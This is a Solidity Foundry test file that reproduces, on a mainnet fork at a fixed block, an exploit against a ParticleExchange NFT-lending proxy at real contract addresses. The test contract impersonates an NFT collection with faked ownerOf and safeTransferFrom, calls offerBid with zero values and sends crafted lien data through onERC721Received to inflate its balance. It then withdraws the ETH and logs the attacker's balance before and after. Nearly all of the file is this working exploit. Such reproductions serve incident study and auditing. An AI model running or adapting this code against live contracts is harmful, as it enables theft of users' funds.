// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/interface/interface.sol";

interface IParticleExchange {
    struct Lien {
        address lender;
        address borrower;
        address collection;
        uint256 tokenId;
        uint256 price;
        uint256 rate;
        uint256 loanStartTime;
        uint256 auctionStartTime;
    }

    function offerBid(
        address collection,
        uint256 margin,
        uint256 price,
        uint256 rate
    ) external returns (uint256 lienId);

    function swapWithEth(Lien calldata lien, uint256 lienId) external;

    function onERC721Received(
        address,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);

    function withdrawAccountBalance() external;

    function accountBalance(address account) external returns (uint256 balance);
}

contract ContractTest is Test {
    address zero = 0x0000000000000000000000000000000000000000;
    IParticleExchange proxy =
        IParticleExchange(0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D);
    address Azuki = 0xB6a37b5d14D502c3Ab0Ae6f3a0E058BC9517786e;
    address Reservoir = 0xC2c862322E9c97D6244a3506655DA95F05246Fd8;
    address ParticleExchange = 0xE4764f9cd8ECc9659d3abf35259638B20ac536E4;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address ownerOfAddr = address(proxy);

    function setUp() public {
        cheats.createSelectFork("mainnet", 19_231_445);
        cheats.label(address(proxy), "proxy");
        cheats.label(address(Azuki), "Azuki");
        cheats.label(address(ParticleExchange), "ParticleExchange");
        cheats.label(address(Reservoir), "Reservoir");
    }

    receive() external payable {}

    function ownerOf(uint256 tokenId) external returns (address owner) {
        return ownerOfAddr;
    }

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata _data
    ) external {
        ownerOfAddr = address(0);
        return;
    }

    function testExploit() public {
        payable(zero).transfer(address(this).balance);
        emit log_named_decimal_uint(
            "Attacker ETH balance before attack: ",
            address(this).balance,
            18
        );
        uint256 tokenId = 50_126_827_091_960_426_151;
        uint256 tokenId2 = 19_231_446;
        uint256 lienId = proxy.offerBid(
            address(this),
            uint256(0),
            uint256(0),
            uint256(0)
        );
        IParticleExchange.Lien memory lien = IParticleExchange.Lien({
            lender: zero,
            borrower: address(this),
            collection: address(this),
            tokenId: 0,
            price: 0,
            rate: 0,
            loanStartTime: 0,
            auctionStartTime: 0
        });
        uint256 amount = 0;
        bytes memory bytecode = (
            abi.encode(lien, lienId, amount, Reservoir, zero, "0x")
        );
        proxy.onERC721Received(zero, zero, tokenId, bytecode);

        IParticleExchange.Lien memory lien2 = IParticleExchange.Lien({
            lender: zero,
            borrower: address(this),
            collection: address(this),
            tokenId: tokenId,
            price: 0,
            rate: 0,
            loanStartTime: block.timestamp,
            auctionStartTime: 0
        });
        bytes memory bytecode2 = (
            abi.encode(lien2, lienId, amount, Reservoir, zero, "0x")
        );
        ownerOfAddr = address(proxy);
        proxy.onERC721Received(zero, zero, tokenId2, bytecode2);

        proxy.accountBalance(address(this));
        proxy.withdrawAccountBalance();

        emit log_named_decimal_uint(
            "Atacker ETH balance after attack ",
            address(this).balance,
            18
        );
    }
}
